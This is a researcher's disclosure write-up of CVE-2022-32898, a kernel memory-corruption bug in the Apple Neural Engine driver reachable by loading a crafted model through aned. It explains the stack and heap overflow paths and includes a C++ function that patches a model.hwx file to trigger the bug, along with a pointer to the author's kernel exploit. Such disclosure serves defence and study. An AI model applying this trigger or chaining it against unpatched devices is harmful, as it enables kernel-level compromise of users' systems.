## Intro:
While reverse-engineering the process of which the Apple Neural Engine loads a model in the kernel level, I identified two interesting memory corruption vulnerabilities in the code responsible for processing the neural network features in `H11ANEIn::ANE_ProgramCreate_gated()`. These kind of vulnerabilities, in my opinion, are easy to find when manually auditing the kernel driver, but nearly impossible to catch with fuzzers unless you build something incredibly sophisticated.

## Analysis:
---

The `ZinComputeProgramGetNamesFromMultiPlaneLinear()` and `ZinComputeProgramGetNamesFromMultiPlaneTiledCompressed()` functions are both responsible for parsing the procedure input and output, or more precisely, the `LC_THREAD` command with thread flavor 2 (`ane_bind_state`) whose `binding_type_info` value is 4 and 5.

From what I can tell, `binding_type_info = 4` means that a procedure's input has more than one plane, and `binding_type_info = 5` means that the input not only has more than one plane but is also compressed.


The `ZinComputeProgramGetNamesFromMultiPlaneLinear()` function for example takes 5 arguments: a load command pointer, a thread binding pointer, and three extra output arguments. The last output argument `planes` is an array that will hold planes, or kernel pointers, whose contents are controlled by the user, and the last argument `planeCount` will indicate how many planes (or kernel pointers) were copied into `planes` from the `model.hwx` file. The following is the function definition:

![Untitled](/img/CVE-2022-32898/image1.png)

Due to the lack of validation of how many planes a model can supply, kernel pointers could be written outside the bounds of the `planes` array, potentially leading to a many interesting memory corruption scenarios.

### Turning the memory corruption to stack overflow:
The `planes` array is a stack variable located in `H11ANEIn::ANE_ProgramCreate_gated()`, and by overflowing this variable (which is supposed to hold multiple planes up to 4 elements) with more than 4 planes, other stack variables could be corrupted as well, which could lead to other issues such as type-confusion since the overwriting kernel pointers are completely under user control. 

Obviously, overflowing the `planes` array with too much entries would likely overwrite the stack cookie as well as the saved old stack frame pointer, resulting in a kernel panic. Fortunately, the total number of planes is entirely within the control of the given model, thus we could corrupt several stack variables without affecting those sensitive areas of the stack.


### Turning the memory corruption to heap overflow:
Another interesting scenario, and as illustrated in the image below, it is possible to overflow two heap objects: `H11ANEProgramBindingInfo` (at line 528) and `H11ANEProgramCreateArgsStructOutput` (at line 533).

![Untitled](/img/CVE-2022-32898/image2.png)

``` c
struct H11ANEProgramBindingInfo
{
        struct {
                uint32_t field_0;
                char names[8][512];
                uint32_t field_1004;
                char *procedure_name;
        } inputs[255], outputs[255];

};
```


The structure definition of `H11ANEProgramCreateArgsStructOutput` is shown above, and  corrupting it could result in the following crashes:

# Trigger the vulnerability:

What makes these vulnerabilities interesting is that it doesn't require you to interact directly with the kernel, in other words, no need to open a UserClient connection, you simply need to compile (or craft) a malicious model and let `aned` load it on your behalf.

As you may know, to load any model via `aned`, the model must be compiled by the `ANECompilerService` system service or signed by Apple. in other words, the app must provide a `.mlmodelc` directory to `aned` which will then request `ANECompilerService` to compile it to `model.hwx` using two frameworks called `Espresso` and `ANECompiler`. 
If you don't know what I'm talking about, you're welcome to take a look at #POC2022 slides [here](https://github.com/0x36/weightBufs/blob/main/attacking_ane_poc2022.pdf) where I gave a basic overview of how `aned` works. In addition, you can get more details about the compilation process in [Wish Wu](https://twitter.com/wish_wu)'s excellent [BlackHat talk](https://www.youtube.com/watch?v=1wvBDUnPNEo&ab_channel=BlackHat) regarding his research on ANE as well as [his great tool](https://github.com/antgroup-arclab/ANETools) that exactly mimics what `ANECompilerService` does.


In our case here, we need a `model.hwx` with a procedure whose input (or output) supports multiple planes. Unfortunately, no such model is available in the `mlmodel`, `mlmodelc` or `mlpackage` format, and only few models in `hwx` format are provided by Apple. Inspecting these `hwx` models revealed that they are using some weird/undocumented neural network operations that don't exist in the open source `coremltools` library code base, hinting that these network layers are likely for internal usage only. However, the implementation of these operations is defined by the `Espresso` framework, and some reversing is required to understand  what inputs and outputs they support and how to properly use them as a layer within a neural network. Since the framework is written in C++ with STL, I had no interest in reversing this operation because it'd take forver.

This was main reason that led me to discover `CVE-2022-32845` which not only allowed me to avoid reversing this scary framework, but also saved me hunders of hours of studying advanced Machine Learning topics.

So I took a simple `model.hwx` and patched one of its *LC_THREAD* commands to replicate the desired outcome in `ane_bind_state`, and then exploited `CVE-2022-32845` to trick `aned` into loading it as if it was signed by Apple; and that was enough to demostrate the vulnerability to Apple.

The function which patches the model is shown below, and you can borrow some codes from my [weightBufs kernel exploit](https://github.com/0x36/weightBufs/) if you want to trigger the vulnerability yourself.

``` c++
void patch_hwx(const mach_header_64 *mh,size_t mh_size)
{
        if((mh->magic != 0xfeedface) && (mh->magic != 0xbeefface)) {
                dbg("[-] Bad Mach-O file \n");
                return ;
        }

        struct load_command *lc = NULL;

        FOR_EACH_COMMAND {

                if (lc->cmd != LC_THREAD)
                        continue;

                dbg("LC_THREAD command found \n");

                compute_thread_command *thread = (compute_thread_command *)lc;
                u32 name_off = 0;
                switch (thread->flavor) {
                case THREAD_BINDING: {
                        name_off = *(uint32_t*)((char*)thread + 0x18);
                        dbg("Binding Name \n");
                        compute_thread_binding * bd =
                                (compute_thread_binding *)&thread->thread_states;

                        bd->binding_typeinfo = 4;
                        bd->field4 = 1;

                        u32 plane_count = 0x30;
                        char *buf_start = (char*)lc + 0x20;
                        *(u32 *) buf_start = 0;
                        *(u32 *) (buf_start + 0x10) = plane_count;
                        char *_ptr = buf_start + 0x6C;
                        int i = 0;
                        uint64_t off = 0;

                        do {
                                if(off == 0)
                                        off = (unsigned int)(_ptr + 4 - (char*)mh) + 8 ;
                                *(unsigned int *)_ptr = mh_size;

                                u64 *pp = (u64 *)&_ptr[4];
                                for(int k = 0; k < 4;k++)
                                        pp[k] = 0x1122334411223344;
                                _ptr += 0x68;

                        }while (i++ < plane_count);

                        patched = true;

                        return;
                }
                case THREAD_PROCEDURE_OPERATION:
                case THREAD_PROCEDURE:
                default:
                        break;
                }

                dbg("\t ProcedureName '%s' \n",(char*)thread + name_off);

        }

}
```


## The patch: 
---
Apple addressed the issue in iOS 16 by introducing some validation checks in both vulnerable functions, limiting the supplied plane count to four entries, as shown below:

That's all for now, see you again soon!
